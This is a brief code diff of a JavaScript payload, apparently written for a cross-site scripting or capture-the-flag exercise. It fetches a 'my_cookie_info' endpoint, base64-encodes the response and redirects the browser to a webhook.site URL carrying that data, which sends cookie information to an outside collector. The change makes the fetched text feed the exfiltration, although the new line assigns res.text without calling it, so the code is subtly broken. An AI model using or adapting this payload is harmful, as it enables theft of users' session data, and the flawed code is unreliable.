@@ -1,6 +1,6 @@
 let htmlText='';
 const request=new XMLHttpRequest();
-fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res =>res.text);
+fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res =>htmlText=res.text);
 setTimeout(function(){
       const aba = btoa(htmlText);
       location.href="https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/"+btoa(htmlText);
